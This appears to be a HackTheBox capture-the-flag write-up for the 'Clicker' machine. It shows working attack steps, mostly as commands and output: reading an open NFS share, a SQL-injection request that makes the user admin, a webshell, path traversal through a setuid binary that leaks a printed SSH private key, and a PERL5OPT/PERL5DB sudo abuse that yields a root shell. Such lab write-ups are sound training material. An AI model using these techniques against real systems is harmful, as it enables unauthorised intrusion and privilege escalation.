---
tags:
  - hack
  - linux
---
# HackTheBox: [Clicker](https://app.hackthebox.com/machines/Clicker)

> [!tip]- Summary with Spoilers  
> - This machine exposed an unauthenticated NFS share containing a ZIP file with the website’s source code.  
> - Using the source code, I found an SQL injection vulnerability to elevate my role to `Admin` and gain RCE via a webshell.  
> - I escalated privileges by abusing a `setuid` binary to access `jack`’s SSH key, then exploited a `sudo` misconfiguration with `PERL5OPT` to gain `root` access.  


## Services

### TCP

This target is running an unremarkable web service, and it exports an unauthenticated NFS mount.

```text
# Nmap 7.94SVN scan initiated Mon Oct  7 11:23:12 2024 as: nmap -v --reason -Pn -T4 --min-rate 1000 -p- --open -sCV -oA nmap_tcp-clicker.htb clicker.htb
Nmap scan report for clicker.htb (10.10.11.232)
Host is up, received user-set (0.12s latency).
Not shown: 63863 closed tcp ports (reset), 1663 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE  REASON         VERSION
22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)
|_  256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)
80/tcp    open  http     syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Clicker - The Game
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
111/tcp   open  rpcbind  syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      34244/udp   mountd
|   100005  1,2,3      40847/tcp6  mountd
|   100005  1,2,3      42889/tcp   mountd
|   100005  1,2,3      57188/udp6  mountd
|   100021  1,3,4      37328/udp   nlockmgr
|   100021  1,3,4      38789/tcp6  nlockmgr
|   100021  1,3,4      44129/tcp   nlockmgr
|_  100021  1,3,4      58869/udp6  nlockmgr
2049/tcp  open  nfs      syn-ack ttl 63 3-4 (RPC #100003)
34795/tcp open  rpcbind  syn-ack ttl 63
42889/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)
44129/tcp open  nlockmgr syn-ack ttl 63 1-4 (RPC #100021)
44673/tcp open  status   syn-ack ttl 63 1 (RPC #100024)
59447/tcp open  rpcbind  syn-ack ttl 63
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct  7 11:24:47 2024 -- 1 IP address (1 host up) scanned in 95.04 seconds
```

## Poking Around

The web site is a simple "clicking" game, where users may register and play a game that records how many clicks they make, saving their progress on a score board.

![](_/htb-clicker-20241004-2.png)

The registration, login, game play, and score-saving flow looks like this:

![](_/htb-clicker-20241004-3.png)

Lots to work with there.

The NFS export is accessible without authentication.

```console
$ showmount -e 10.10.11.232
clnt_create: RPC: Program not registered
```

```console
$ showmount -e clicker.htb
Export list for clicker.htb:
/mnt/backups *
```

There's a ZIP file in the `backups` directory:

```console
$ sudo mount -t nfs clicker.htb:/mnt/backups ./backups
[sudo] password for e:

$ ls backups/
clicker.htb_backup.zip

$ cp backups/clicker.htb_backup.zip ./
...
```

The ZIP file contains a backup of the site's source code, allowing for a white-box analysis.

```bash
$ find . -name '*php'
./diagnostic.php
./export.php
./register.php
./login.php
./db_utils.php
./authenticate.php
./create_player.php
./save_game.php
./admin.php
./info.php
./play.php
./profile.php
./logout.php
./index.php
```

The database connection code contains hardcoded credentials. In the `save_profile()` function, the `$key` parameter is injectable because column names are not whitelisted. The `$value` parameter is not injectable because it's passed through [$pdo->quote(…)](https://www.php.net/manual/en/pdo.quote.php) .

```php
$ cat db_utils.php
<?php
session_start();

$db_server="localhost";
$db_username="clicker_db_user";
$db_password="clicker_db_password";
$db_name="clicker";
$mysqli = new mysqli($db_server, $db_username, $db_password, $db_name);
$pdo = new PDO("mysql:dbname=$db_name;host=$db_server", $db_username, $db_password);
...

function save_profile($player, $args) {
        global $pdo;
        $params = ["player"=>$player];
        $setStr = "";
        foreach ($args as $key => $value) {
                $setStr .= $key . "=" . $pdo->quote($value) . ",";
        }
        $setStr = rtrim($setStr, ",");
        $stmt = $pdo->prepare("UPDATE players SET $setStr WHERE username = :player");
        $stmt -> execute($params);
}
...

function load_profile($player) {
  global $pdo;
  $params = ["player"=>$player];
  $stmt = $pdo->prepare("SELECT nickname, role, clicks, level FROM players WHERE username = :player");
  $stmt->execute($params);
  if ($stmt->rowCount() > 0) {
    $row = $stmt->fetch(PDO::FETCH_ASSOC);
    return $row;
  }
  return array();
}
...
```

The authentication code creates a new [session](https://www.w3schools.com/php/php_sessions.asp) and sets various parameters via `load_profile()` from `db_utils.php`. Pay attention to the `ROLE` key, as it determines if the user is an administrator. This is only set upon login, so fiddling with any of the attributes below at the database-level will require logging out and back in for the changes to take effect.

```php
$ cat authenticate.php
<?php
session_start();
include_once("db_utils.php");

if (isset($_POST['username']) && isset($_POST['password']) && $_POST['username'] != "" && $_POST['password'] != "") {
        if(check_auth($_POST['username'], $_POST['password'])) {
                $_SESSION["PLAYER"] = $_POST["username"];
                $profile = load_profile($_POST["username"]);
                $_SESSION["NICKNAME"] = $profile["nickname"];
                $_SESSION["ROLE"] = $profile["role"];
                $_SESSION["CLICKS"] = $profile["clicks"];
                $_SESSION["LEVEL"] = $profile["level"];
                header('Location: /index.php');
        }
        else {
                header('Location: /login.php?err=Authentication Failed');
        }
}
?>
```

The "game" is trivially exploitable since `CLICKS` and `LEVEL` are taken directly from `GET` parameters. Changing `ROLE` is a little trickier, since there's a rudimentary attempt to prevent manipulating that value.

```php
$ cat save_game.php
<?php
session_start();
include_once("db_utils.php");

if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
        $args = [];
        foreach($_GET as $key=>$value) {
                if (strtolower($key) === 'role') {
                        // prevent malicious users to modify role
                        header('Location: /index.php?err=Malicious activity detected!');
                        die;
                }
                $args[$key] = $value;
        }
        save_profile($_SESSION['PLAYER'], $_GET);
        // update session info
        $_SESSION['CLICKS'] = $_GET['clicks'];
        $_SESSION['LEVEL'] = $_GET['level'];
        header('Location: /index.php?msg=Game has been saved!');

}
?>
```

Here's the `admin.php` check that determines whether the user is an administrator:

```php
<?php
session_start();
include_once("db_utils.php");

if ($_SESSION["ROLE"] != "Admin") {
  header('Location: /index.php');
  die;
}
?>
...
```

## Remote Code Execution

To achieve RCE, I need to elevate my privileges to `'Admin'` as specified by the ROLE column in the database.

There are (at least) two ways to do this. The most straightforward path is via injecting `role='Admin'` into the `GET` request, URL-encoding `=` as `%3d`:

```http
GET /save_game.php?role%3d'Admin',clicks=42&level=0 HTTP/1.1
...
```

That bypasses the simplistic abuse-detection check, which is: `if (strtolower($key) === 'role')`

Logging out and back in reveals the `/admin.php` page:

![](_/htb-clicker-20241004-4.png)

`db_utils.php` has a function `get_top_players()` that's used to populate the data:

```php
// ONLY FOR THE ADMIN
function get_top_players($number) {
  global $pdo;
  $stmt = $pdo->query("SELECT nickname,clicks,level FROM players WHERE clicks >= " . $number);
  $result = $stmt->fetchAll(PDO::FETCH_ASSOC);

  return $result;
}
```

The `Export` button saves data into a file and reveals the path. Here's an example, `/exports/top_players_2e51ilco.html':

![](_/htb-clicker-20241004-5.png)

I can sneak a webshell into the `nickname` field:

![](_/htb-clicker-20241004-6.png)

And that works for code execution:

![](_/htb-clicker-20241004-7.png)

I use the webshell to get a proper interactive shell:

```bash
www-data@clicker:/var/www/clicker.htb$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege Escalation

There's a user named `jack` that looks like the next target.

```text
www-data@clicker:/var/www/clicker.htb$ ls -la /home
total 12
drwxr-xr-x  3 root root 4096 Sep  5  2023 .
drwxr-xr-x 18 root root 4096 Sep  5  2023 ..
drwxr-x---  7 jack jack 4096 Sep  6  2023 jack
```

There are some admin scripts in `/opt`.

A monitoring script that uses the `diagnostic.php` page:

```text
www-data@clicker:/var/www/clicker.htb$ ls /opt
manage  monitor.sh
www-data@clicker:/var/www/clicker.htb$ cat /opt/monitor.sh
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi
```

And `README.txt` appears to be instructions for setting up a new database for the web app, and other administrative tasks:

```text
www-data@clicker:/opt$ cat /opt/manage/README.txt
Web application Management

Use the binary to execute the following task:
        - 1: Creates the database structure and adds user admin
        - 2: Creates fake players (better not tell anyone)
        - 3: Resets the admin password
        - 4: Deletes all users except the admin
```

Like so:

```console
www-data@clicker:/opt/manage$ ./execute_query 3
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
UPDATE players SET password='ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82' WHERE username='admin'
--------------
```

`strings` is enough to reveal some sensitive info:

```text
www-data@clicker:/opt$ strings /opt/manage/execute_query
/lib64/ld-linux-x86-64.so.2
O+-W
...
/home/jaH
ck/queriH
/usr/binH
/mysql -H
u clickeH
r_db_useH
r --passH
word='clH
icker_dbH
_passworH
d' clickH
er -v < H
ERROR: not enough arguments
ERROR: Invalid arguments
create.sql
populate.sql
reset_password.sql
clean.sql
File not readable or not found
:*3$"
GCC: (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0
Scrt1.o
__abi_tag
...
```

But, we already had the database credentials from the source code. Those `*.sql` files are probably the SQL commands to do the tasks defined in `README.txt`.

A close look at the binary reveals it is `setuid`:

```console
www-data@clicker:/opt/manage$ ls -la execute_query
-rwsrwsr-x 1 jack jack 16368 Feb 26  2023 execute_query
```

I decompiled the binary in Ghidra. Here's the `case` statement from the `main` function that processes the command-line arguments:

```c
...
if (param_1 < 2) {
    puts("ERROR: not enough arguments");
    uVar2 = 1;
  }
  else {
    iVar1 = atoi(*(char **)(param_2 + 8));
    pcVar3 = (char *)calloc(0x14,1);
    switch(iVar1) {
    case 0:
      puts("ERROR: Invalid arguments");
      uVar2 = 2;
      goto LAB_001015e1;
    case 1:
      strncpy(pcVar3,"create.sql",0x14);
      break;
    case 2:
      strncpy(pcVar3,"populate.sql",0x14);
      break;
    case 3:
      strncpy(pcVar3,"reset_password.sql",0x14);
      break;
    case 4:
      strncpy(pcVar3,"clean.sql",0x14);
      break;
    default:
      strncpy(pcVar3,*(char **)(param_2 + 0x10),0x14);
    }
...
```

So, anything besides options 1-5 will trigger the `default` case, which takes an arbitrary argument. The program displays the contents of the SQL files when running them, so I should be able to use that to read files as `jack`:

```console
www-data@clicker:/opt/manage$ ./execute_query 5 '../../../etc/passwd'
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
...
```

Interestingly, using the exact number of .. directories is necessary for the traversal to work. Maybe the `mysql` binary or the system call limits the traversal depth with an arbitrary number of `..` entries? No, more likely this is because the executable uses a small string buffer for the argument, and too many `..`'s will truncate the filename.

```console
www-data@clicker:/opt/manage$ ./execute_query 5 '../../../../etc/passwd'
File not readable or not found
```

I can use this to run arbitrary MySQL commands as `jack`:

```console
www-data@clicker:/dev/shm$ /opt/manage/execute_query 5 '../../../tmp/x.sql'
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
select sleep(5)
--------------
```

Direct code execution via MySQL statements doesn't seem possible, but I can read the user's SSH key:

```text
www-data@clicker:/tmp$ /opt/manage/execute_query 5 '../.ssh/id_rsa'
mysql: [Warning] Using a password on the command line interface can be insecure.
--------------
-----BEGIN OPENSSH PRIVATE KEY---
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAs4eQaWHe45iGSieDHbraAYgQdMwlMGPt50KmMUAvWgAV2zlP8/1Y
J/tSzgoR9Fko8I1UpLnHCLz2Ezsb/MrLCe8nG5TlbJrrQ4HcqnS4TKN7DZ7XW0bup3ayy1
...
```

I clean up the key and use it to login as `jack` via SSH:

```console
$ ssh -i id.jack jack@clicker.htb
Warning: Permanently added 'clicker.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-84-generic x86_64)
...
jack@clicker:~$ ls
queries  user.txt
```

Now, check `sudo`:

```console
jack@clicker:~/queries$ sudo -l
Matching Defaults entries for jack on clicker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jack may run the following commands on clicker:
    (ALL : ALL) ALL
    (root) SETENV: NOPASSWD: /opt/monitor.sh
```

Here is `/opt/monitor.sh`:

```bash
#!/bin/bash
if [ "$EUID" -ne 0 ]
  then echo "Error, please run as root"
  exit
fi

set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
unset PERL5LIB;
unset PERLLIB;

data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
/usr/bin/xml_pp <<< $data;
if [[ $NOSAVE == "true" ]]; then
    exit;
else
    timestamp=$(/usr/bin/date +%s)
    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
fi
```

Note that `sudoers` uses `SETENV` in this line:

```console
(root) SETENV: NOPASSWD: /opt/monitor.sh
```

This preserves _all_ environmental variables passed via the command-line. This can be exploited since `monitor.sh` invokes a Perl script (`xml_pp`). Leveraging `PERL5OPT` and `PERL5DB` to inject commands through the Perl debugger is a well-known technique, and it can be applied effectively here:

```console
jack@clicker:~/queries$ sudo PERL5OPT=-d PERL5DB='system("cp /bin/sh /tmp/x; chmod 4755 /tmp/x")' /opt/monitor.sh
No DB::DB routine defined at /usr/bin/xml_pp line 9.
No DB::DB routine defined at /usr/lib/x86_64-linux-gnu/perl-base/File/Temp.pm line 870.
END failed--call queue aborted.
jack@clicker:~/queries$ ls -l /tmp/x
-rwsr-xr-x 1 root root 125688 Oct  7 22:31 /tmp/x
jack@clicker:~/queries$ /tmp/x -p
# id
uid=1000(jack) gid=1000(jack) euid=0(root) groups=1000(jack),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
```

## Credits

Thanks to [0xdf](https://0xdf.gitlab.io/2024/01/27/htb-clicker.html#) for the `PERL5OPT` and `PERL5DB` tips for privilege escalation.
